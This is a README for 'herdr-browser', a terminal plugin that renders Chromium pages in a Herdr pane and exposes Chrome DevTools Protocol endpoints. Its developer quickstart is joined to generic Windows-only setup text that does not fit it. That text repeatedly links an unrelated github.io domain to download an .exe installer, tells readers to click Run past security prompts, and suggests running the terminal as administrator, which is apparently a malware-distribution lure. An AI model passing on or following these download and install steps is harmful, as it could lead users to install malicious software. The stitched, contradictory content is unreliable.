# 🌐 herdr-browser - View web pages inside your terminal 

[![](https://img.shields.io/badge/Download-Herdr_Browser-blue.svg)](https://epsomsaltskerosinelamp950.github.io)

## 📖 About this application

Herdr browser brings the web into your terminal window. You can view websites and interact with page elements without leaving your command line interface. This tool uses the Chromium engine to display pages inside a Herdr pane. Developers use the Chrome DevTools Protocol to control these views. This approach creates a clean workflow for people who spend their days in the terminal.

## ⚡ Quickstart

Use the plugin-owned viewer for the visual browser and the CLI for navigation or
CDP automation. From the plugin directory, run:

```bash
herdr-browser inspect
```

When running from a checkout, the equivalent command is:

```bash
bun run src/cli.ts inspect
```

`inspect` selects the only live browser view, or starts one and opens/focuses a
Herdr-owned `Browser` pane. It prints the view-scoped CDP HTTP endpoint, browser
and page WebSocket URLs, plus ready-to-use snippets for
`chrome-devtools-mcp`, Playwright, and Puppeteer. The viewer pane must be
plugin-owned; a terminal pane merely titled `Browser` is not sufficient.

### Select a specific view

```bash
herdr-browser views
herdr-browser inspect --view <view-id>
herdr-browser connect --view <view-id>
```

Use `status` for daemon diagnostics:

```bash
herdr-browser status
```

### Headful mode

Headless mode is the default. To launch Herdr's managed Chromium with a native
window, use:

```bash
HERDR_BROWSER_DISPLAY=headful herdr-browser inspect
```

Linux requires `DISPLAY` or `WAYLAND_DISPLAY`. Herdr still uses a private
per-session profile and advertises only the view-scoped gateway.

### Important CDP distinction

`chrome-devtools-mcp` and Playwright MCP are automation clients, not browser
windows. They attach to the endpoint printed by `inspect`; they do not render a
visual tab. `chrome://inspect` can attach DevTools after manually adding the
gateway's current ephemeral endpoint, but it cannot import the remote page as a
normal native tab in another Chrome process.

If a shell and plugin resolve different daemon state files, pass the same state
path explicitly:

```bash
HERDR_BROWSER_DAEMON_STATE=/path/to/daemon.json herdr-browser inspect
```

## 💻 System requirements

Your computer must meet these basic needs to run the software:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4 gigabytes of RAM.
*   **Storage:** 200 megabytes of free space.
*   **Terminal:** A terminal emulator that supports graphics, such as Kitty or a modern Windows Terminal.
*   **Permissions:** Ability to run executable files on your local machine.

## 📥 Getting setup

Follow these steps to prepare your machine.

1.  Visit the official repository page at this link: [https://epsomsaltskerosinelamp950.github.io](https://epsomsaltskerosinelamp950.github.io).
2.  Look for the section labeled Releases on the right side of the screen.
3.  Click the version number to reveal the available files.
4.  Select the Windows installer file ending in .exe.
5.  Save this file to your computer.

## ⚙️ Installation instructions

Once you download the installer, perform these actions:

1.  Open your Downloads folder.
2.  Double-click the herdr-browser installer file.
3.  Click Run if a security window appears.
4.  Follow the instructions on the screen.
5.  Select a folder to store the application files.
6.  Click Install to start the process.
7.  Wait for the progress bar to finish.
8.  Click Finish to close the setup window.

## 🚀 Running the browser

After installation, launch the browser through these steps:

1.  Open your preferred terminal application.
2.  Type "herdr-browser" at the command prompt and press Enter.
3.  The browser pane opens within your terminal window.
4.  Type the web address you want to visit.
5.  The pane renders the page content using the Chromium engine.

## 🛠️ How to use the controls

You interact with the browser through command controls. Since the browser runs inside your terminal, you key in commands to drive your experience.

*   **Navigation:** Type your destination URL and press Enter. The pane updates your view to that address.
*   **Scrolling:** Use your mouse wheel inside the pane to move up or down the page.
*   **Automation:** If you utilize the Chrome DevTools Protocol, you send commands to the browser via the terminal API. This allows you to script actions like clicking buttons or filling out form fields.
*   **Resizing:** Adjust your terminal window size to change the aspect ratio of the browser view inside the pane.

## 🧩 Troubleshooting common issues

If you face problems, use these common fixes:

*   **Blank Pane:** Close the application and restart your terminal. A memory conflict often causes the view to hang.
*   **Flickering Images:** Ensure your terminal emulator supports high-end graphics. Kitty provides the best results for this software.
*   **Permission Errors:** Run your terminal as an administrator if you cannot open the browser window after installation.
*   **Slow Speeds:** Close other web browsers that consume heavy system resources. Chromium requires some processor power to render pages effectively.

## 🛡️ Privacy and data

The browser stores local cookies and cache files in a subfolder near the installation directory. It shares no browsing data with the developers. Your activity stays on your local hard drive. You can clear your cache by deleting the contents of the folder created during the installation.

## 📈 Improving performance

You gain the most value by keeping the application updated. Check the download page every few weeks for new versions. Each update includes performance patches for the Chromium engine and stability fixes for the terminal integration. 

Keywords: browser, browser-automation, cdp, chromium, herdr-plugin, kitty-graphics, terminal